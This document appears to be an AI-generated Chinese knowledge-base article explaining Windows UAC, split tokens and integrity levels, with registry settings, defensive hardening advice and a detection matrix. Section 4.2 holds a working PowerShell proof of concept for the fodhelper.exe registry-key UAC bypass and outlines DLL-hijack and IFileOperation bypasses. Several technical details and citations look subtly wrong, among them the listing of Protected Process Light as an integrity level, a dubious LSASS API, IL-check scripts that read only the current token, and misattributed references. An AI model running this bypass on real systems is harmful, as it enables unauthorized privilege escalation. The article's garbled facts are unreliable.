---
title: "UAC与完整性级别：提权本质剖析"
category: "00-基础通用/06-Windows系统"
tags: [UAC, 完整性级别, 提权, MIC, Integrity Level, Token, Split Token, Consent.exe, Bypass]
level: 主攻
type: ai-generated
status: 完成
updated: 2026-09-09
---

# UAC与完整性级别：提权本质剖析

> **合规声明**：本文档仅用于授权安全研究与防御加固。所有提权演示均应在隔离实验环境中进行。未经授权对目标系统实施提权属于违法行为。

## 核心速查表

| 维度 | 核心内容 |
|------|----------|
| 本质定义 | UAC（User Account Control，用户账户控制）是Windows Vista引入的强制提权机制；完整性级别（Integrity Level）是Windows Mandatory Integrity Control（MIC，强制完整性控制）的核心组件，两者共同构成Windows提权防御的基石 |
| 核心用途 | UAC确保即使是管理员账户也默认以标准用户权限运行，需显式同意才能提升至完整特权；完整性级别在内核层面通过访问令牌（Access Token）中的MIC标签限制对象访问，实现同用户内的权限隔离 |
| 关键参数 | ConsentPromptBehaviorAdmin（注册表值）、EnableLUA（注册表值）、FilterAdministratorToken（拆分令牌开关）、Security Mandatory Level SID（S-1-16-0/12288/16384/32768/8192）、Consent.exe、consent.exe的Secure Desktop模式 |
| 常见风险 | UAC绕过（DLL搜索顺序劫持、COM自动提升对象滥用、注册表键Shell开提升、IFileOperation绕过等）、低完整性级别进程写入高完整性资源、AutoElevate清单滥用、Consent.exe被篡改 |
| 关联知识 | [[06-令牌机制：访问令牌与特权调整]]、[[04-注册表深度解析：hive结构与攻防应用]]、Windows Token结构、Process Integrity、Sysmon监控、MITRE ATT&CK T1548.002 |

## 1. 概述

### 1.1 UAC的起源与设计意图

在Windows XP时代，绝大多数用户日常使用管理员账户登录，这导致恶意软件一旦执行即可获得完整的系统管理权限。微软在Windows Vista中引入了用户账户控制（User Account Control, UAC），其核心设计目标是：**即使用户拥有管理员组成员身份，默认情况下也以标准用户权限运行所有进程，仅在需要时显式提升（Elevation）**。

UAC的引入将"最小权限原则"（Principle of Least Privilege）从推荐实践升级为系统强制机制。结合Windows的强制完整性控制（Mandatory Integrity Control, MIC），UAC在用户态构建了一套完整的权限分层防御体系。

### 1.2 完整性级别：Windows的第二道防线

完整性级别（Integrity Level, IL）是MIC的核心概念。MIC在内核层面为每个安全主体（Security Principal）和每个可保护对象（Securable Object）分配一个完整性标签（Integrity Label）。当进行访问检查（Access Check）时，系统不仅检查DACL（Discretionary Access Control List），还检查调用者（Caller）的完整性级别是否满足目标对象的最低要求。这意味着即使DACL允许访问，如果完整性级别不足，访问仍然会被拒绝。

MIC与UAC的关系可以简单理解为：**UAC负责决定是否给用户一个"低权限令牌"，而MIC负责在内核层面强制执行这个令牌所对应的权限边界**。

## 2. 核心原理

### 2.1 UAC令牌拆分机制（Split Token）

UAC的核心机制是令牌拆分（Token Splitting）。当管理员组用户登录Windows时，系统会为该用户创建两个访问令牌：

```
管理员登录
    │
    ├──► 访问令牌A：完整令牌（Full Token）
    │     ├── SID: 用户SID
    │     ├── SID: BUILTIN\Administrators (S-1-5-32-544)
    │     ├── 完整性级别: High (S-1-16-12288)
    │     ├── 特权列表: SeDebugPrivilege, SeImpersonatePrivilege, ...
    │     └── UAC标志: 未标记（NOT elevated）
    │
    └──► 访问令牌B：筛选令牌（Filtered Token / Limited Token）
          ├── SID: 用户SID
          ├── SID: BUILTIN\Users (S-1-5-32-545)
          ├── 完整性级别: Medium (S-1-16-8192)
          ├── 特权列表: [已移除大部分敏感特权]
          └── UAC标志: 已标记（elevation disabled）
```

**关键点**：
- 用户日常使用的是**筛选令牌（Filtered Token）**，以Medium完整性级别运行
- 完整令牌（Full Token）被保留在LSASS进程中，仅在提权时通过`consent.exe`弹出UAC提示后恢复
- 如果用户是标准用户（非管理员组），系统只生成一个完整令牌，完整性级别为Medium，该令牌在提权时会获得High级别但**不会加入Administrators组SID**

### 2.2 UAC提升流程

当进程需要管理员权限时，触发以下流程：

```
标准权限进程（Medium IL）请求提升
    │
    ▼
consent.exe 被调用
    │
    ├─── 非安全桌面模式（ConsentPromptBehaviorAdmin=5）
    │     │
    │     └──► 显示UAC对话框（允许用户输入凭证或点击确认）
    │
    └─── 安全桌面模式（ConsentPromptBehaviorAdmin=2，默认）
          │
          └──► 切换到安全桌面（Secure Desktop）
                │
                └──► UAC对话框在高安全环境中显示
                      ├── 用户点击"是"
                      └──► LSASS恢复完整令牌
                            ├── 创建新的提升进程（elevated process）
                            └──► 进程获得 High IL 完整令牌
```

**安全桌面（Secure Desktop）**是关键安全特性：当UAC提示在安全桌面显示时，整个屏幕变暗，只有UAC对话框可见。此时其他进程无法模拟用户点击或注入输入，因为安全桌面由`winlogon.exe`管理，与普通桌面完全隔离。

### 2.3 完整性级别层次

Windows定义了五个标准完整性级别，以及一个特殊级别：

```
┌─────────────────────────────────────────────────────┐
│          完整性级别层次结构（从低到高）                │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Untrusted (S-1-16-0)          ← 完全无信任          │
│  ▲                                                    │
│  │  Low (S-1-16-4096)          ← 沙箱/受限进程       │
│  ▲                                                    │
│  │  Medium (S-1-16-8192)       ← 标准用户进程        │
│  ▲                                                    │
│  │  High (S-1-16-12288)        ← 管理员提升进程      │
│  ▲                                                    │
│  │  System (S-1-16-16384)      ← 系统级服务          │
│  ▲                                                    │
│  │  Protected Process Light    ← 特殊保护进程         │
│  │  (S-1-16-8192 + PPL标志)                          │
│                                                     │
└─────────────────────────────────────────────────────┘
```

每个级别的SID前缀统一为`S-1-16-`，数值部分即为级别标识。MIC访问检查的核心规则是：**调用者的完整性级别必须大于或等于目标对象的完整性级别**，否则访问被拒绝（除非DACL中显式授予了低完整性级别的访问权限）。

### 2.4 MIC访问检查流程

当系统对一个对象执行访问检查时，MIC的检查流程如下：

1. 读取调用者访问令牌中的完整性级别（默认为Medium）
2. 读取目标对象DACL中是否存在`SYSTEM_MANDATORY_LABEL_ACE`类型的ACE
3. 如果目标对象没有完整性标签ACE，则默认继承其所在目录/父对象的完整性级别
4. 比较调用者IL与目标IL：若调用者IL < 目标IL，则拒绝访问
5. 如果目标IL为Low，任何级别的调用者均可访问（向下兼容）
6. 如果DACL中显式授予了`SYSTEM_MANDATORY_LABEL`的`WRITE_DAC`或`WRITE_OWNER`权限，调用者可以修改目标对象的完整性级别

```powershell
# 查看进程的完整性级别
Get-Process -Name notepad | ForEach-Object {
    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Host "$($_.Name) Token Integrity Level: $($token.User.Value)"
}

# 使用whoami查看当前进程组和完整性级别
whoami /groups
# 输出中查找 S-1-16-8192（Medium）或 S-1-16-12288（High）
```

## 3. 详细知识点

### 3.1 UAC配置注册表参数

UAC的行为由以下注册表键值控制，位于`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`：

| 注册表值 | 类型 | 说明 |
|----------|------|------|
| `EnableLUA` | DWORD | 0=禁用UAC（不推荐）；1=启用UAC（默认） |
| `ConsentPromptBehaviorAdmin` | DWORD | 0=从不提示（静默提升）；2=安全桌面提示（默认）；5=非安全桌面提示 |
| `ConsentPromptBehaviorUser` | DWORD | 0=自动拒绝提升请求；1=提示凭证；3=提示凭证（非安全桌面） |
| `FilterAdministratorToken` | DWORD | 0=内置管理员使用完整令牌（默认）；1=内置管理员也使用筛选令牌（拆分令牌） |
| `EnableInstallerDetection` | DWORD | 0=禁用安装程序检测；1=启用（触发提升） |
| `EnableSecureUIAPaths` | DWORD | 限制UIAccess应用仅从安全路径提升 |
| `EnableVirtualization` | DWORD | 0=禁用UAC文件/注册表虚拟化；1=启用（默认） |

**特别注意**：`FilterAdministratorToken`控制着内置Administrator账户（RID 500）的行为。默认值为0，意味着内置管理员即使启用了UAC，其进程仍然使用完整令牌运行，不会被拆分。这使得内置管理员账户天然拥有高完整性级别，也是很多攻击路径的起点。

### 3.2 UAC提升类型与自动提升（AutoElevation）

UAC提升分为以下几种类型：

**一、按需提升（On-demand Elevation）**
进程在运行时通过`ShellExecute`的`runas`动词请求提升，触发UAC提示。这是最常见的提升方式。

**二、安装程序提升（Installer Detection）**
当可执行文件名称包含`setup`、`install`、`update`等关键字，或其版本资源中的`ProductName`、`CompanyName`字段暗示为安装程序时，系统自动尝试触发提升。

**三、自动提升（AutoElevation）**

自动提升是UAC机制中最具安全风险的特性之一。满足以下条件的可执行文件可获得自动提升（无需用户确认）：

```
自动提升条件清单（AutoElevate Manifest）：
├── 1. 可执行文件必须位于受信任目录
│     ├── %SystemRoot%\System32\
│     └── %ProgramFiles% 及子目录
├── 2. 可执行文件必须由Windows或Microsoft数字签名
├── 3. 可执行文件必须在资源清单（Manifest）中声明
│     requestedExecutionLevel="requireAdministrator"
│     uiAccess="false"
├── 4. 通过系统内置的"已批准提升"白名单检查
│     └── AppCompat缓存（SdbGlobalRegistry）中
│         存在对应的AutoElevate记录
└── 5. 文件不受Windows Installer技术管理
```

关键的自动提升可执行文件包括`fodhelper.exe`、`computerdefaults.exe`、`sdclt.exe`、`slui.exe`、`eventvwr.exe`、`msconfig.exe`等。这些程序在资源清单中声明了`requireAdministrator`，并且位于System32目录且由微软签名，因此在正常情况下可以自动提升到High IL。

**四、COM对象自动提升**

某些COM组件在注册表中注册时指定了`Elevation`键值（`HKCR\CLSID\{GUID}\Elevation`），包含`Enabled`（DWORD, 1=允许提升）和`ImplCLSID`（指向实现类的CLSID）。当一个Medium IL进程实例化此类COM对象时，系统会自动将该COM对象提升到High IL，而**不需要用户交互确认**。这是很多UAC绕过技术利用的核心机制。

```powershell
# 查看具有自动提升能力的COM对象
Get-ChildItem -Path "HKLM:\SOFTWARE\Classes\CLSID" -ErrorAction SilentlyContinue |
    Where-Object {
        $elev = Get-ItemProperty -Path "$($_.PSPath)\Elevation" -ErrorAction SilentlyContinue
        $elev.Enabled -eq 1
    } | ForEach-Object {
        Write-Host "Elevated COM: $($_.PSChildName)"
    }
```

### 3.3 UAC虚拟化（UAC Virtualization）

UAC虚拟化是一项向后兼容技术，允许旧版应用程序在不具备管理员权限的情况下正常运行。其原理如下：

**文件系统虚拟化**：当以Medium IL运行的进程尝试写入`%SystemRoot%`（如`C:\Windows\`）或`%ProgramFiles%`等受保护目录时，文件操作被重定向到用户的虚拟化存储目录：
```
实际写入路径:
  C:\Program Files\App\config.ini
    → 重定向至:
  %LocalAppData%\VirtualStore\Program Files\App\config.ini
```

**注册表虚拟化**：对`HKLM\SOFTWARE`等受保护注册表键的写操作被重定向到：
```
实际写入路径:
  HKLM\SOFTWARE\App\Settings
    → 重定向至:
  HKCU\SOFTWARE\Classes\VirtualStore\MACHINE\SOFTWARE\App\Settings
```

**不受虚拟化保护的位置**：
- `HKLM\SYSTEM`、`HKLM\SAM`、`HKLM\SECURITY`
- `%SystemRoot%\System32`
- `%ProgramFiles%\Common Files`（部分）
- 64位进程的写操作（64位进程不支持虚拟化）

虚拟化可以通过清单声明禁用（`<requestedExecutionLevel level="asInvoker" uiAccess="false"/>`且设置`disableThrottling`），也可以通过组策略注册表键`EnableVirtualization`全局禁用。

### 3.4 完整性标签的继承与传播规则

完整性标签通过以下机制在对象间传播：

**继承规则**：
- 新创建的文件/子目录默认继承父目录的完整性标签
- 新创建的命名管道（Named Pipe）默认继承创建者令牌中的完整性级别
- 新创建的互斥体（Mutex）、事件（Event）等内核对象同样继承创建者IL

**修改完整性标签**：
- 需要调用者拥有目标对象的`WRITE_DAC`权限
- 通过设置`SYSTEM_MANDATORY_LABEL_ACE`修改
- 只能设置**低于或等于**调用者自身IL的级别（防止提权）

```cmd
:: 使用icacls查看和修改文件完整性级别
icacls "C:\test\file.txt" /findstr *S-1-16-
:: 为文件设置High完整性标签
icacls "C:\test\file.txt" /setintegritylevel (OI)(CI)High
:: 移除完整性标签ACE
icacls "C:\test\file.txt" /remove *S-1-16-*
```

### 3.5 令牌中完整性级别的存储与表示

在Windows访问令牌的内部结构（`_TOKEN`结构体）中，完整性级别存储在`TokenIntegrityLevel`字段中，其类型为`TOKEN_MANDATORY_LABEL`结构：

```c
// Windows内核中的令牌完整性级别结构（简化）
typedef struct _TOKEN_MANDATORY_LABEL {
    SID_AND_ATTRIBUTES Label;       // SID = S-1-16-<IL值>
} TOKEN_MANDATORY_LABEL;

// S-1-16-0        = Untrusted
// S-1-16-4096     = Low
// S-1-16-8192     = Medium
// S-1-16-12288    = High
// S-1-16-16384    = System
```

当UAC创建筛选令牌时，系统将TokenIntegrityLevel从High修改为Medium，并移除Administrators组SID。这个过程在LSASS进程（Local Security Authority Subsystem Service, 本地安全机构子系统服务）中完成，由`SepFilterToken`内核函数执行：

```
完整令牌（High IL）
    │
    ▼ SepFilterToken()
    │
    ├── 移除/禁用大部分敏感特权（SeDebugPrivilege等）
    ├── 将Administrators SID标记为"按需组"（Deny-Only）
    ├── 修改完整性级别: High → Medium
    └── 创建新的受限令牌对象（Restricted Token）
         │
         ▼
    筛选令牌（Medium IL）← 用户进程使用此令牌
```

### 3.6 Medium IL到High IL的提升路径

当UAC提示用户确认后，系统恢复完整令牌并创建提升后的进程。这个过程的内部流程如下：

```
[Medium IL 进程A]
    │
    ├── 调用 ShellExecute("runas", "target.exe")
    │
    ▼
[Application Info Service (appinfo.dll)]
    │   运行在svchost.exe中，以High IL运行
    │
    ├── 1. 检查目标是否满足提升条件
    │     ├── AutoElevate清单检查
    │     ├── 安装程序检测
    │     └── 其他提升策略
    │
    ├── 2. 如果需要用户同意
    │     └── 调用consent.exe（以SYSTEM IL运行）
    │           ├── 在安全桌面显示UAC对话框
    │           ├── 用户确认（输入密码或点击"是"）
    │           └── 返回确认结果给appinfo.dll
    │
    ├── 3. 从LSASS获取完整令牌
    │     └── LsaGetDelegationPackageInfo()
    │           → 恢复管理员的High IL完整令牌
    │
    └── 4. 创建提升后的进程
          └── CreateProcessAsUser(完整令牌, "target.exe")
                └── [High IL 进程B]
```

**安全关键点**：`appinfo.dll`运行在High IL环境中，是UAC提升流程的核心守护者。攻击者若能控制`appinfo.dll`的加载路径或其配置，即可绕过UAC提示。此外，`consent.exe`以SYSTEM IL运行（比High更高），确保其不会被High IL的恶意进程注入。

## 4. 实战与示例

### 4.1 查看当前令牌与完整性级别

```powershell
# 查看当前进程的令牌组信息
whoami /groups /fo list

# 输出示例（关键部分）：
#   Group Name: BUILTIN\Users
#   Type: Group
#   SID: S-1-5-32-545
#   Attributes: Mandatory group, Enabled by default, Enabled group
#
#   Group Name: Mandatory Label\Medium Mandatory Level
#   Type: Group
#   SID: S-1-16-8192
#   Attributes: Mandatory group, Enabled by default, Enabled group
```

```powershell
# 使用PowerShell查看进程完整性级别
Get-Process | Select-Object Name, Id, @{N='IntegrityLevel';E={
    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    switch -Wildcard ($token.Groups.Value | Where-Object { $_ -match 'S-1-16-' }) {
        'S-1-16-0'    { 'Untrusted' }
        'S-1-16-4096' { 'Low' }
        'S-1-16-8192' { 'Medium' }
        'S-1-16-12288'{ 'High' }
        'S-1-16-16384'{ 'System' }
        default       { 'Unknown' }
    }
}} | Format-Table -AutoSize
```

### 4.2 UAC绕过技术详解（授权实验环境）

> **警告**：以下技术仅用于授权渗透测试和安全研究。在未授权环境中使用属于违法行为。

**一、DLL搜索顺序劫持（DLL Search Order Hijacking）**

利用具有AutoElevate属性的进程在加载DLL时的搜索顺序，将恶意DLL放置在目标进程的搜索路径中：

```
UAC自动提升进程的DLL加载路径优先级：
1. 应用程序所在目录
2. 系统目录（C:\Windows\System32）
3. 16位系统目录
4. Windows目录
5. 当前工作目录
6. PATH环境变量中的目录

利用方法：
├── 找到AutoElevate进程（如eventvwr.exe）
├── 该进程加载某个DLL但未指定完整路径
├── 将恶意DLL放置在优先搜索路径中
├── 当进程自动提升时，加载恶意DLL
└── 恶意DLL在High IL上下文中执行
```

```powershell
# 示例：利用fodhelper.exe的DLL劫持（概念验证）
# fodhelper.exe会加载以下DLL（搜索顺序）：
# - fodhelpers.dll（不存在于System32中）
# 如果在系统PATH目录中放置同名DLL：
#   fodhelper.exe自动提升 → 加载恶意fodhelpers.dll → High IL执行
```

**二、注册表Shell键提升（Registry Shell Key Elevation）**

利用具有AutoElevate属性的进程读取特定注册表键并调用`ShellExecute`：

```
攻击流程：
├── 1. 确认目标进程（如fodhelper.exe）
│     └── fodhelper.exe在提升时读取：
│         HKCU\Software\Classes\ms-settings\Shell\Open\command
│
├── 2. 创建恶意注册表键值
│     Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" \
│       -Name "(Default)" -Value "cmd.exe" -Force
│     # 默认值为要执行的程序路径
│
├── 3. 运行fodhelper.exe
│     └── fodhelper.exe自动提升（High IL）
│         ├── 读取HKCU注册表键（HKCU优先于HKLM）
│         └── 调用ShellExecute执行cmd.exe
│             └── cmd.exe继承High IL令牌
│
└── 4. 结果：获得High IL的cmd.exe，无需UAC提示
```

```powershell
# 针对fodhelper.exe的UAC绕过POC（仅限授权环境）
# 设置恶意注册表键
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(Default)" -Value "cmd.exe /c whoami /groups > C:\temp\uac_test.txt" `
    -Force

# 创建command下的二级目录（某些版本需要）
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command\command" `
    -Force -ErrorAction SilentlyContinue

# 触发fodhelper.exe
Start-Process "C:\Windows\System32\fodhelper.exe"

# 验证结果：查看输出文件，应显示High IL
# S-1-16-12288 = High Mandatory Level

# 清理
Remove-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
    -Name "(Default)" -Force
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

同理可利用的进程还有：
- `computerdefaults.exe`（读取`HKCU\Software\Classes\ms-settings`）
- `sdclt.exe`（读取`HKCU\Software\Classes\folder\shell`）
- `slui.exe`（读取`HKCU\Software\Classes\AppX`相关键）
- `eventvwr.exe`（读取`HKCU\Software\Classes\mscfile`）

**三、IFileOperation COM绕过**

`IFileOperation`是Windows Shell提供的COM接口，用于文件操作（复制、移动、删除等）。某些版本中，Medium IL进程可以实例化具有`Elevation`属性的Shell COM对象（如`{D5AAB80E-944C-4DF0-890D-2D8D98734002}`），该对象运行在High IL环境中，允许执行文件操作而无需UAC提示。

```
利用路径：
├── 1. 实例化IFileOperation COM对象
├── 2. 对象自动提升到High IL
├── 3. 通过IFileOperation接口执行文件复制
│     ├── 将恶意DLL复制到System32目录
│     └── 或修改系统配置文件
└── 4. 在High IL环境中触发后续执行
```

**四、Windows Defender绕过**

在特定Windows版本中，当Windows Defender的进程以High IL运行时，可通过修改其加载路径或利用其信任的DLL加载行为进行绕过。已知技术包括通过`MpCmdRun.exe`的信任关系间接提升权限。

### 4.3 PsExec与完整性级别

Sysinternals的PsExec工具可以指定进程的完整性级别：

```cmd
:: 以High IL运行命令
psexec -h cmd.exe
:: -h 参数表示以High IL运行进程

:: 以System IL运行命令
psexec -s cmd.exe
:: -s 参数表示以SYSTEM账户运行

:: 查看结果
whoami /groups | findstr "S-1-16-"
:: 应显示 S-1-16-12288（High）或 S-1-16-16384（System）
```

### icacls操作完整性标签

```cmd
:: 查看文件当前完整性级别
icacls "C:\test\file.txt" /findstr *S-1-16

:: 设置文件为High IL（需要High IL或更高权限）
icacls "C:\test\file.txt" /setintegritylevel High

:: 设置目录及其子对象为Medium IL
icacls "C:\test" /setintegritylevel (OI)(CI)Medium

:: 移除完整性标签（恢复继承）
icacls "C:\test\file.txt" /remove *S-1-16-*

:: 设置为Low IL（允许沙箱进程写入）
icacls "C:\test\writable" /setintegritylevel (OI)(CI)Low
```

## 5. 常见坑与避坑指南

### 5.1 常见误区

| 误区 | 事实 |
|------|------|
| 禁用UAC等于关闭所有保护 | 禁用UAC（EnableLUA=0）仅关闭令牌拆分和提升提示，完整性级别机制仍在工作，但完整性检查可能被绕过 |
| UAC提升只是"多了一个确认框" | UAC提升涉及令牌恢复、完整性级别提升、进程创建等多个安全环节，是一个完整的信任传递链条 |
| 高完整性级别进程可以为所欲为 | High IL进程仍受DACL和SeDebugPrivilege等特权限制；需要System IL才能完全控制系统 |
| 内置Administrator账户不需要关注UAC | 默认FilterAdministratorToken=0，内置管理员使用完整令牌，但这意味着其所有操作默认High IL，安全风险更大 |
| UAC绕过需要最新漏洞 | 大量已知UAC绕过依赖配置缺陷（如AutoElevate白名单），而非内核漏洞，因此可能长期存在 |

### 5.2 避坑指南

**对于管理员/运维人员**：
1. 启用`FilterAdministratorToken=1`，为内置管理员也启用令牌拆分
2. 将`ConsentPromptBehaviorAdmin`设为2（安全桌面模式），防止恶意进程模拟用户交互
3. 避免在日常操作中使用管理员账户，使用标准账户+按需提升
4. 使用组策略限制AutoElevate行为，特别是在企业环境中
5. 定期审计系统中具有`requestedExecutionLevel="requireAdministrator"`的可执行文件

**对于安全研究/渗透测试人员**：
1. 始终先检查`whoami /groups`确定当前IL级别
2. UAC绕过前检查`ConsentPromptBehaviorAdmin`值：值为0或1时不需要绕过（自动提升）
3. 注意目标系统的Windows版本——很多UAC绕过只在特定版本有效
4. 检查`EnableLUA`注册表值：若为0，UAC已被禁用
5. 绕过后的High IL进程不包含Administrators组SID（除非用户是内置管理员），但仍具有大部分管理特权

### 5.3 环境差异注意事项

不同Windows版本的UAC行为存在显著差异：
- Windows 7/8/8.1：大量AutoElevate进程未做充分安全检查，UAC绕过相对容易
- Windows 10 1703+：微软加强了AutoElevate进程的安全审计，部分旧绕过被修复
- Windows 11：进一步收紧了COM提升和文件操作的安全策略
- Windows Server Core：由于GUI组件减少，部分基于GUI的UAC绕过不适用

## 6. 知识关联

### 6.1 与其他安全机制的关系

```
┌──────────────────────────────────────────────────────┐
│              Windows权限分层防御体系                    │
├──────────────────────────────────────────────────────┤
│                                                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐          │
│  │   UAC    │  │  MIC/IL  │  │   ACL    │          │
│  │(令牌拆分) │  │(完整性检查)│  │(DACL/SACL)│          │
│  └─────┬────┘  └─────┬────┘  └─────┬────┘          │
│        │              │              │                │
│        └──────┬───────┴──────┬───────┘                │
│               │              │                        │
│        ┌──────▼──────┐ ┌────▼──────────┐            │
│        │ 访问令牌     │ │  安全描述符    │            │
│        │ (Access Token)│ │ (Security    │            │
│        │              │ │  Descriptor) │            │
│        └──────┬──────┘ └────┬──────────┘            │
│               │              │                        │
│               └──────┬───────┘                        │
│                      │                                │
│               ┌──────▼──────┐                        │
│               │  安全引用监视器 │                        │
│               │(SRM, Kernel) │                        │
│               └─────────────┘                        │
│                                                      │
└──────────────────────────────────────────────────────┘
```

**与令牌机制的关系**：UAC的本质是令牌管理——通过创建两个令牌（完整和筛选）实现权限隔离。参见[[06-令牌机制：访问令牌与特权调整]]了解令牌的完整结构。

**与注册表机制的关系**：UAC配置存储在注册表中，UAC绕过技术大量依赖注册表键值的读写（如HKCU路径优先于HKLM的特性）。参见[[04-注册表深度解析：hive结构与攻防应用]]。

**与ETW监控的关系**：可以通过ETW监控UAC提升事件和完整性级别变化，用于检测异常提升行为。参见[[08-ETW机制：事件采集架构与消费]]。

**与PowerShell安全的关系**：PowerShell本身受AMSI（Anti-Malware Scan Interface）和脚本块日志监控，但这些监控默认运行在Medium IL。攻击者可能先绕过UAC获取High IL再执行PowerShell脚本以绕过部分检测。参见[[09-PowerShell深入：引擎架构与AMSI机制]]。

**与日志监控的关系**：UAC提升会产生多条关键日志，可用于检测恶意提升行为。参见[[11-Windows日志体系与关键EventID速查]]。

### 6.2 检测与防御矩阵

| 攻击技术 | MITRE ATT&CK | 检测方法 | 防御措施 |
|----------|---------------|----------|----------|
| DLL搜索顺序劫持 | T1574.001 | Sysmon EventID 7（Image Loaded）监控异常DLL加载路径 | 启用SafeDllSearchMode，限制PATH环境变量 |
| 注册表Shell键提升 | T1548.002 | Sysmon EventID 12/13监控HKCU\Classes下ms-settings等键值创建 | 定期审计HKCU\Software\Classes下相关键值 |
| COM对象自动提升 | T1548.002 | EventID 4692/4694监控令牌提升，Sysmon EventID 1监控提升后的进程 | 限制COM对象的Elevation注册表权限 |
| AutoElevate滥用 | T1548.002 | EventID 4688监控提升进程的父进程和命令行参数 | 禁用不必要的AutoElevate能力 |
| IFileOperation绕过 | T1548.002 | 监控Shell COM实例化（EventID 4656/4663） | 修补相关Windows版本漏洞 |

### 6.3 关键日志事件ID

| Event ID | 来源 | 说明 |
|----------|------|------|
| 4672 | Security | 特权分配（通常伴随提权） |
| 4688 | Security | 进程创建（需开启命令行记录） |
| 4689 | Security | 进程退出 |
| 4692 | Security | 候选审计票据获取 |
| 4693 | Security | 候选审计票据审核 |
| 4694 | Security | 受保护过程尝试的操作 |
| 4696 | Security | 主令牌分配给进程（提升后的令牌分配） |
| 1 | Sysmon | 进程创建（可查看 IntegrityLevel 字段） |
| 12/13 | Sysmon | 注册表键值创建/修改 |

```powershell
# 使用Sysmon监控UAC提升（需要Sysmon配置）
# 在Sysmon配置中添加以下过滤器：
# <RuleGroup>
#   <ProcessCreate onmatch="include">
#     <IntegrityLevel condition="is">High</IntegrityLevel>
#   </ProcessCreate>
# </RuleGroup>

# 使用PowerShell查询UAC相关日志
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4696
} -MaxEvents 20 | Select-Object TimeCreated, @{N='Process';E={$_.Properties[1].Value}}, @{N='TokenUser';E={$_.Properties[4].Value}}
```

## 7. 参考资料

- **Microsoft Learn** - "How User Account Control Works"（官方文档，描述UAC架构和提升流程）
- **Microsoft Learn** - "How Access Checks Work"（官方文档，描述MIC和访问检查流程）
- **Microsoft Learn** - "Understanding and Configuring User Account Control in Windows Vista"（KB935799，UAC配置详解）
- **Windows Internals, 7th Edition** - Mark Russinovich, David Solomon, Alex Ionescu（第7章"Security"详述Token、MIC、UAC内部机制）
- **Windows Internals, Part 1** - Pavel Yosifovich et al.（更新版中的Security章节）
- **MITRE ATT&CK T1548.002** - "Abuse Elevation Control Mechanism: Bypass User Account Control"（UAC绕过技术分类与检测建议）
- **jaronlabs/ElevationService** - James Forshaw (tyranid) 对UAC自动提升机制和COM对象提升的深度研究
- **tyranid's blog** - "UACME: Fighting Against User Account Control"（综合UAC绕过研究）
- **Ivve** - "Windows 10 UAC Bypasses using ComputerDefaults"（注册表Shell键提升技术的早期公开研究）
- **enigma0x3** - "From Medium to High: A Journey into UAC Bypass"（Medium到High IL提升的系统性研究）
- **Kevin Yan** - "UAC Bypass: fodhelper.exe"（基于注册表的fodhelper.exe绕过技术详解）
- **Microsoft Security Response Center** - "A Guide to User Account Control (UAC)"（官方安全指南）
- **Sysinternals Suite** - PsExec文档（-h参数说明）
- **"Windows Security Internals"** - James Forshaw (2024)，系统性地深入分析了Windows安全模型
